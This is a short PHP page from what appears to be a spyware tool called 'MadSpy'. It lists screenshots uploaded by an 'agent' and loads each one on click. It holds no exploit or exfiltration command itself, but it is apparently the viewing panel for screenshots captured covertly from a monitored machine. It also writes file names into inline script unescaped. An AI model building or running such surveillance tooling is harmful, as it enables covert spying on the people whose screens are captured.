
<html><head>
<link rel="stylesheet" type="text/css" href="../src/main.css" />
<style type="text/css">
.list {
  color:blue;
  cursor:pointer;
  text-decoration:underline; 
}
.list:hover {
  color: white;
}
table { 
  border-collapse: collapse; 
}
tr { 
  border-bottom: solid 1px lightgray; 
}
td {
  border: none
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head><body>
<h1>MadSpy</h1>
<h3>Agent's screenshots list</h3>
<p>Full list of uploaded screenshots by the agent. The entry will load on click.</p>
<br>
<?php

echo "<table class='pretty-table'><tr><th scope='col'></th><th scope='col' width='200px'>Upload m/d/Y H:i:s</th><th scope='col'></th></tr>";

foreach (glob("files/*.html") as $file) 
{
  $dt = explode('/', explode('-', $file)[0])[1];
  echo "<tr style='cursor:pointer;' onclick=\"$('.item').empty();$('#";
  echo $dt;
  echo "').load('";
  echo $file;
  echo "');\"><td scope='row'><img src='../src/cam_icon.png' /></td><td><div>";
  echo date('m/d/Y H:i:s', $dt);
  echo "</div></td><td><div class='item' id='";
  echo $dt;
  echo "'></div></td></tr>";
}
echo "</table>";
?>
</body></html>                 

